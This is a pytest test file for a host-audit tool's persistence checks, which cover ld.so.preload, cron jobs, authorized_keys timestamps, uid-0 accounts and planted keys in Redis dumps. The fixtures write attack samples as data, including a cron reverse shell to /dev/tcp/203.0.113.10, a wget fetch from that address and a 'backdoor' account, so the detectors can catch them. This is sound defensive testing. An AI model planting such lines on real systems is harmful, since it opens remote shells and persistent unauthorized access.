"""The persistence checks, run against a synthetic host tree."""

from __future__ import annotations

import os
import time

from support import context, write

from holdfast.audit.checks import persistence
from holdfast.audit.model import FAIL, PASS, UNKNOWN, WARN

INDICATORS = """
addresses = ["203.0.113.10"]
filenames = ["planted.php"]
accounts = ["backdoor"]
"""


def age(path, days: float) -> None:
    when = time.time() - days * 86400
    os.utime(path, (when, when))


def with_indicators(tmp_path, **extra):
    path = tmp_path / "iocs.toml"
    path.write_text(INDICATORS, encoding="utf-8")
    return context(tmp_path, **{"audit.indicators": str(path), **extra})


# -- ld_so_preload ----------------------------------------------------------


def test_no_preload_file_passes(tmp_path):
    status, detail, _ = persistence._ld_so_preload(context(tmp_path))
    assert status == PASS
    assert "absent" in detail


def test_an_empty_preload_file_passes(tmp_path):
    write(tmp_path, "/etc/ld.so.preload", "\n")
    assert persistence._ld_so_preload(context(tmp_path))[0] == PASS


def test_a_populated_preload_file_fails(tmp_path):
    write(tmp_path, "/etc/ld.so.preload", "/usr/lib/libhide.so\n")
    status, detail, _ = persistence._ld_so_preload(context(tmp_path))
    assert status == FAIL
    assert "libhide.so" in detail


# -- scheduled_jobs ---------------------------------------------------------


def test_no_schedules_at_all_is_unknown(tmp_path):
    assert persistence._scheduled_jobs(context(tmp_path))[0] == UNKNOWN


def test_an_ordinary_old_crontab_passes(tmp_path):
    path = write(tmp_path, "/etc/crontab", "17 * * * * root cd / && run-parts\n")
    age(path, 400)
    assert persistence._scheduled_jobs(context(tmp_path))[0] == PASS


def test_a_reverse_shell_in_cron_fails(tmp_path):
    path = write(
        tmp_path,
        "/etc/cron.d/backup",
        "* * * * * root bash -i >& /dev/tcp/203.0.113.10/9\n",
    )
    age(path, 400)
    status, detail, _ = persistence._scheduled_jobs(context(tmp_path))
    assert status == FAIL
    assert "/etc/cron.d/backup:1" in detail


def test_an_indicator_address_in_cron_fails(tmp_path):
    path = write(tmp_path, "/etc/cron.d/fetch", "* * * * * root wget 203.0.113.10/x\n")
    age(path, 400)
    assert persistence._scheduled_jobs(with_indicators(tmp_path))[0] == FAIL


def test_the_same_line_passes_without_an_indicator_list(tmp_path):
    path = write(tmp_path, "/etc/cron.d/fetch", "* * * * * root wget 203.0.113.10/x\n")
    age(path, 400)
    assert persistence._scheduled_jobs(context(tmp_path))[0] == PASS


def test_a_freshly_changed_schedule_warns(tmp_path):
    write(tmp_path, "/etc/crontab", "17 * * * * root run-parts /etc/cron.hourly\n")
    status, detail, _ = persistence._scheduled_jobs(context(tmp_path))
    assert status == WARN
    assert "/etc/crontab" in detail


# -- authorized_keys_times --------------------------------------------------


def test_no_key_file_is_unknown(tmp_path):
    assert persistence._authorized_keys_times(context(tmp_path))[0] == UNKNOWN


def test_a_settled_key_file_passes(tmp_path):
    """The clean case needs recent_days at zero, and that is not a dodge.

    Moving a file's mtime back also leaves its ctime at now, on any filesystem
    that records metadata changes - which is exactly the signature the forged
    branch looks for. So a genuinely old key file cannot be built inside a
    temporary directory. What can be built is one that is neither forged nor
    inside the recency window.
    """
    write(tmp_path, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAA a@example.com\n")
    ctx = context(tmp_path, **{"audit.recent_days": 0})
    status, detail, _ = persistence._authorized_keys_times(ctx)
    assert status == PASS
    assert "/root/.ssh/authorized_keys" in detail


def test_a_recently_changed_key_file_warns(tmp_path):
    write(tmp_path, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAA a@example.com\n")
    status, detail, _ = persistence._authorized_keys_times(context(tmp_path))
    assert status == WARN
    assert "substitution" in detail


def test_an_mtime_far_older_than_ctime_fails(tmp_path):
    """What `touch -t` over a rewritten file leaves behind."""
    path = write(
        tmp_path, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAA a@example.com\n"
    )
    age(path, 400)  # moves mtime back; ctime stays now
    status, detail, _ = persistence._authorized_keys_times(context(tmp_path))
    assert status == FAIL
    assert "auth.log" in detail


# -- account_changes --------------------------------------------------------


def test_no_passwd_is_unknown(tmp_path):
    assert persistence._account_changes(context(tmp_path))[0] == UNKNOWN


def test_an_ordinary_passwd_passes(tmp_path):
    path = write(tmp_path, "/etc/passwd", "root:x:0:0::/root:/bin/bash\n")
    age(path, 400)
    assert persistence._account_changes(context(tmp_path))[0] == PASS


def test_a_second_uid_zero_fails(tmp_path):
    path = write(
        tmp_path,
        "/etc/passwd",
        "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\n",
    )
    age(path, 400)
    status, detail, _ = persistence._account_changes(context(tmp_path))
    assert status == FAIL
    assert "toor has uid 0" in detail


def test_an_account_on_the_indicator_list_fails(tmp_path):
    path = write(
        tmp_path,
        "/etc/passwd",
        "root:x:0:0::/root:/bin/bash\nbackdoor:x:1001:1001::/home/backdoor:/bin/sh\n",
    )
    age(path, 400)
    status, detail, _ = persistence._account_changes(with_indicators(tmp_path))
    assert status == FAIL
    assert "indicator list" in detail


def test_a_freshly_changed_passwd_warns(tmp_path):
    write(tmp_path, "/etc/passwd", "root:x:0:0::/root:/bin/bash\n")
    assert persistence._account_changes(context(tmp_path))[0] == WARN


# -- datastore_persistence --------------------------------------------------


def test_no_data_files_is_unknown(tmp_path):
    assert persistence._datastore_persistence(context(tmp_path))[0] == UNKNOWN


def test_a_clean_dump_passes(tmp_path):
    write(tmp_path, "/var/lib/docker/volumes/cache/_data/dump.rdb", "ordinary data\n")
    status, detail, _ = persistence._datastore_persistence(context(tmp_path))
    assert status == PASS
    assert "1 data store files" in detail


def test_a_key_planted_in_a_dump_fails(tmp_path):
    write(
        tmp_path,
        "/var/lib/docker/volumes/cache/_data/dump.rdb",
        "somekey\n/root/.ssh/authorized_keys\nssh-rsa AAAA\n",
    )
    status, detail, _ = persistence._datastore_persistence(context(tmp_path))
    assert status == FAIL
    assert "authorized_keys" in detail
    assert "ssh-rsa" in detail


def test_an_empty_file_name_list_is_unknown(tmp_path):
    ctx = context(tmp_path, **{"audit.datastore.files": []})
    assert persistence._datastore_persistence(ctx)[0] == UNKNOWN


def test_scan_bytes_finds_a_marker_across_a_chunk_boundary(tmp_path):
    """The overlap is the whole reason the helper exists."""
    path = tmp_path / "big.rdb"
    marker = b"authorized_keys"
    filler = b"x" * (1024 * 1024 - 5)
    path.write_bytes(filler + marker + b"y" * 10)
    found = persistence.scan_bytes(path, (marker,), 32 * 1024 * 1024)
    assert found == {"authorized_keys"}
